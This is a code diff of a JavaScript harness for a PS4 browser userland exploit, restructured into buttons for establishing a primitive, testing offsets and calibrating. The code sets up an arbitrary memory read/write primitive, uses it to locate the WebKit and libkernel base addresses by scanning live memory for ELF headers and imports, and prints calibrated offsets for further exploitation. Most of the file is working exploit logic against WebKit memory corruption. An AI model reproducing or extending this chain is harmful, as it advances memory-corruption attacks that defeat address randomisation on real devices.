@@ -5,11 +5,22 @@ import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
+const fwSelect = document.getElementById("fw-select");
+const btnEstablish = document.getElementById("btn-establish");
+const btnOffsets = document.getElementById("btn-offsets");
+const btnCalibrate = document.getElementById("btn-calibrate");
+const btnAll = document.getElementById("btn-all");
+const btnClear = document.getElementById("btn-clear");
+const btnLowMem = document.getElementById("btn-lowmem");
+
+const params = new URLSearchParams(location.search);
 const lines = [];
 let passCount = 0;
 let failCount = 0;
+let busy = false;
+let primitiveDone = false;
 
-const params = new URLSearchParams(location.search);
+const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
 
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
@@ -22,6 +33,49 @@ function mark(tag, detail) {
 function state(msg, cls) {
     stateEl.textContent = msg;
     stateEl.className = cls || "";
+}
+
+function clearLog() {
+    lines.length = 0;
+    passCount = 0;
+    failCount = 0;
+    outEl.innerHTML = "";
+}
+
+function resolvedOffKey() {
+    const pick = fwSelect.value;
+    if (pick === "auto") {
+        const detected = offsetsFor(navigator.userAgent);
+        return detected.key || "13.00";
+    }
+    return pick;
+}
+
+function crossFw(offKey) {
+    const detected = offsetsFor(navigator.userAgent);
+    return detected.key && detected.key !== offKey;
+}
+
+function setUi() {
+    const hasP = !!window.p;
+    btnEstablish.disabled = busy || primitiveDone;
+    btnOffsets.disabled = busy || !hasP;
+    btnCalibrate.disabled = busy || !hasP;
+    btnAll.disabled = busy || primitiveDone;
+    btnClear.disabled = busy;
+    fwSelect.disabled = busy || primitiveDone;
+}
+
+async function withBusy(fn) {
+    if (busy) return;
+    busy = true;
+    setUi();
+    try {
+        await fn();
+    } finally {
+        busy = false;
+        setUi();
+    }
 }
 
 function check(name, ok, detail) {
@@ -89,7 +143,7 @@ function findWebkitBase(p, nativeFn) {
         const base = nativeFn.sub32(delta);
         if (!alignedModuleBase(base)) continue;
         try {
-            if (p.read4(base).low === 0x464c457f) // \x7fELF
+            if (p.read4(base).low === 0x464c457f)
                 return { base, wk_expm1_builtin: delta };
         } catch (_) { }
     }
@@ -97,7 +151,6 @@ function findWebkitBase(p, nativeFn) {
 }
 
 function findErrorImport(p, webkitBase, hintRva) {
-    const lo = webkitBase.low;
     const hi = webkitBase.hi;
     const windows = hintRva
         ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
@@ -127,7 +180,7 @@ function findErrorImport(p, webkitBase, hintRva) {
 }
 
 function calibrateOffsets(p, off) {
-    mark("CALIBRATE", "scanning live module layout (no dump needed)");
+    mark("CALIBRATE", "scanning live module layout");
     const mFunctionOff = off.wk_JSFunction_m_function || 0x28;
     const nativeFn = nativeExpm1(p, mFunctionOff);
     mark("CAL-NATIVEFN", String(nativeFn));
@@ -146,66 +199,52 @@ function calibrateOffsets(p, off) {
         mark("CAL-k__error", "0x" + err.k__error.toString(16));
         mark("CAL-LK-BASE", String(err.libkernelBase));
     } else {
-        mark("CALIBRATE-WARN", "__imp___error not found — paste CAL-wk_expm1_builtin only");
+        mark("CALIBRATE-WARN", "__imp___error not found");
     }
 
     return Object.assign({
         wk_JSFunction_m_function: mFunctionOff,
         wk_ArrayBuffer_m_impl: off.wk_ArrayBuffer_m_impl,
         wk_ArrayBuffer_m_contents_m_data: off.wk_ArrayBuffer_m_contents_m_data,
-    }, wk.wk_expm1_builtin != null ? { wk_expm1_builtin: wk.wk_expm1_builtin } : {},
-       err || {});
+    }, { wk_expm1_builtin: wk.wk_expm1_builtin }, err || {});
 }
 
-async function run() {
+function logBootInfo() {
     const detected = offsetsFor(navigator.userAgent);
-    const offKey = params.get("fw") || detected.key || "13.00";
-    const { off } = offsetsForKey(offKey);
-    const lite = params.get("lite") === "1";
-    const maxAttempts = Math.max(1, parseInt(params.get("attempts") || "1", 10) || 1);
-    const doCalibrate = params.get("calibrate") === "1";
-
     mark("UA", navigator.userAgent);
     mark("UA-FW", detected.key || "unknown");
-    mark("OFFSETS-FW", offKey + (detected.key && detected.key !== offKey
-        ? " (forced; UA reports " + detected.key + ")" : ""));
-    if (lite)
-        mark("MODE", "lite — primitive self-test only, no calibrate/offset scans");
-    mark("MEM-TIP", "OOM? close browser fully, reopen, use ?attempts=1 (default) "
-        + "never ?pair=1, optional ?g=drain:384");
-    if (!off)
-        throw new Error("no offset table for fw=" + offKey);
-    mark("OFFSETS", off.fw_status || "loaded");
+    if (params.has("g"))
+        mark("BOOT", "groom override: " + params.getAll("g").join(", "));
+    else
+        mark("BOOT", "default groom — use low-mem reload if OOM");
+}
 
-    const crossFw = detected.key && detected.key !== offKey;
-    if (crossFw)
-        mark("NOTE", "UA FW != offset table — offset checks may fail; primitive still valid");
+async function runEstablish() {
+    if (primitiveDone) {
+        mark("SKIP", "primitive already established this page");
+        return;
+    }
 
     state("establishing primitive...", "warn");
+    mark("STEP", "1 · get primitive");
 
-    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
     const carrier = await establishPrimitive({
-        maxAttempts,
+        maxAttempts: 1,
         onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})
             (t, (a != null ? "[" + a + "] " : "") + (d || ""))
     });
 
-    const PAIR_ON = params.get("pair") === "1";
-    if (PAIR_ON)
-        mark("MEM-WARN", "pair=1 releases ~137MB garbage — high OOM risk on PS4 browser");
     installWindowP(carrier, {
-        promote: PAIR_ON,
+        promote: false,
         onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
     });
 
     const p = window.p;
     if (!p) throw new Error("window.p was not installed");
 
+    primitiveDone = true;
     mark("PAIR-STATUS", "state=" + pairStatus.state
-        + " promoted=" + pairStatus.promoted
-        + " stage=" + pairStatus.stage
-        + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : ""));
-
+        + " promoted=" + pairStatus.promoted);
     mark("PRIMITIVE-OK", "window.p read/write/leakval live");
 
     const boxA = { tag: "A" };
@@ -220,85 +259,143 @@ async function run() {
     p.write8(addrA, headerA);
     check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");
 
+    state("primitive OK — run step 2 or 3", "ok");
+    mark("READY", "offset tests and calibrate unlocked");
+}
+
+async function runOffsetTests() {
+    const p = window.p;
+    if (!p) throw new Error("run step 1 first");
+
+    const offKey = resolvedOffKey();
+    const { off } = offsetsForKey(offKey);
+    if (!off) throw new Error("no offset table for fw=" + offKey);
+
+    mark("STEP", "2 · offset tests");
+    mark("OFFSETS-FW", offKey);
+    mark("OFFSETS", off.fw_status || "loaded");
+    if (crossFw(offKey))
+        mark("NOTE", "UA FW != offset table — fails here are expected");
+
+    state("offset tests...", "warn");
+
     const probe = new ArrayBuffer(0x20);
     const view = new Uint32Array(probe);
     view[0] = 0xdeadbeef;
     view[1] = 0xcafebabe;
 
     let offsetFail = 0;
-    function checkOffset(name, ok, detail) {
+    const checkOffset = (name, ok, detail) => {
         if (ok) {
             passCount++;
             mark("PASS", name + (detail ? "  " + detail : ""));
         } else {
             failCount++;
             offsetFail++;
-            mark(crossFw ? "FAIL-OFFSET" : "FAIL", name + (detail ? "  " + detail : ""));
+            mark(crossFw(offKey) ? "FAIL-OFFSET" : "FAIL", name + (detail ? "  " + detail : ""));
         }
         return ok;
+    };
+
+    const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
+    if (backing)
+        mark("AB-BACKING", backing.label + " -> " + backing.ptr);
+
+    const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
+    checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
+    const got = p.read4(dataPtr);
+    checkOffset("arraybuffer-read4",
+        got.low === 0xdeadbeef,
+        "got=0x" + got.toString(16) + " ptr=" + dataPtr);
+    if (got.low === 0xdeadbeef) {
+        p.write4(dataPtr, new int64(0x13371337, 0));
+        checkOffset("arraybuffer-write4",
+            view[0] === 0x13371337,
+            "view[0]=" + view[0].toString(16));
     }
 
-    if (!lite && off) {
-        const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
-        if (backing)
-            mark("AB-BACKING", backing.label + " -> " + backing.ptr);
-
-        const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
-        checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
-        const got = p.read4(dataPtr);
-        checkOffset("arraybuffer-read4",
-            got.low === 0xdeadbeef,
-            "got=0x" + got.toString(16) + " ptr=" + dataPtr);
-        if (got.low === 0xdeadbeef) {
-            p.write4(dataPtr, new int64(0x13371337, 0));
-            checkOffset("arraybuffer-write4",
-                view[0] === 0x13371337,
-                "view[0]=" + view[0].toString(16));
-            view[0] = 0xdeadbeef;
-        }
-
-        if (off.wk_expm1_builtin) {
-            const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
-            const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-            const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-            const libkernelBase = errorFn.sub32(off.k__error);
-            mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-                + " nativeFn=" + nativeFn);
-            checkOffset("module-bases-0x4000-aligned",
-                alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
-        }
-    } else if (lite) {
-        mark("SKIP", "offset/arraybuffer tests (lite=1)");
+    if (off.wk_expm1_builtin) {
+        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
+        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+        const libkernelBase = errorFn.sub32(off.k__error);
+        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
+            + " nativeFn=" + nativeFn);
+        checkOffset("module-bases-0x4000-aligned",
+            alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
     }
 
-    if (doCalibrate && !lite) {
-        const live = calibrateOffsets(p, off);
-        if (live && live.wk_expm1_builtin != null) {
-            mark("PASTE-OFFSETS", JSON.stringify({
-                fw_status: "calibrated on hardware",
-                wk_expm1_builtin: live.wk_expm1_builtin,
-                wk_JSFunction_m_function: live.wk_JSFunction_m_function,
-                wk___imp___error: live.wk___imp___error,
-                k__error: live.k__error,
-                wk_ArrayBuffer_m_impl: live.wk_ArrayBuffer_m_impl,
-                wk_ArrayBuffer_m_contents_m_data: live.wk_ArrayBuffer_m_contents_m_data,
-            }, null, 0));
-        }
-    }
-
-    const coreFail = failCount - offsetFail;
-    const summary = passCount + " pass, " + failCount + " fail"
-        + (crossFw && offsetFail ? " (" + offsetFail + " offset-table on wrong FW)" : "");
-    if (coreFail === 0) {
-        state("userland primitive OK — " + summary, offsetFail && crossFw ? "warn" : "ok");
-        mark("DONE", summary);
-    } else {
-        state("failures — " + summary, "bad");
-        mark("DONE", summary);
-    }
+    const summary = passCount + " pass, " + failCount + " fail";
+    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
+    mark("DONE-OFFSETS", summary);
 }
 
-run().catch(err => {
-    state("error: " + err.message, "bad");
-    mark("ERROR", err.stack || err.message);
+async function runCalibrate() {
+    const p = window.p;
+    if (!p) throw new Error("run step 1 first");
+
+    const offKey = resolvedOffKey();
+    const { off } = offsetsForKey(offKey);
+    if (!off) throw new Error("no offset table for fw=" + offKey);
+
+    mark("STEP", "3 · calibrate wk_*");
+    mark("OFFSETS-FW", offKey + " (hint for __imp___error scan)");
+    state("calibrating...", "warn");
+
+    const live = calibrateOffsets(p, off);
+    if (live && live.wk_expm1_builtin != null) {
+        mark("PASTE-OFFSETS", JSON.stringify({
+            fw_status: "calibrated on hardware",
+            wk_expm1_builtin: live.wk_expm1_builtin,
+            wk_JSFunction_m_function: live.wk_JSFunction_m_function,
+            wk___imp___error: live.wk___imp___error,
+            k__error: live.k__error,
+            wk_ArrayBuffer_m_impl: live.wk_ArrayBuffer_m_impl,
+            wk_ArrayBuffer_m_contents_m_data: live.wk_ArrayBuffer_m_contents_m_data,
+        }, null, 0));
+    }
+
+    state("calibrate done", "ok");
+    mark("DONE-CALIBRATE", "");
+}
+
+function wireButton(el, handler) {
+    el.addEventListener("click", () => {
+        withBusy(async () => {
+            try {
+                await handler();
+            } catch (err) {
+                state("error: " + err.message, "bad");
+                mark("ERROR", err.stack || err.message);
+            }
+        });
+    });
+}
+
+wireButton(btnEstablish, runEstablish);
+wireButton(btnOffsets, runOffsetTests);
+wireButton(btnCalibrate, runCalibrate);
+wireButton(btnAll, async () => {
+    await runEstablish();
+    await runOffsetTests();
 });
+
+btnClear.addEventListener("click", () => {
+    if (busy) return;
+    clearLog();
+    logBootInfo();
+    state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
+});
+
+btnLowMem.addEventListener("click", () => {
+    const url = new URL(location.href);
+    url.searchParams.set("g", "drain:384");
+    location.href = url.toString();
+});
+
+if (params.get("fw") && fwSelect.querySelector(`option[value="${params.get("fw")}"]`))
+    fwSelect.value = params.get("fw");
+
+state("ready — tap step 1", "");
+logBootInfo();
+setUi();
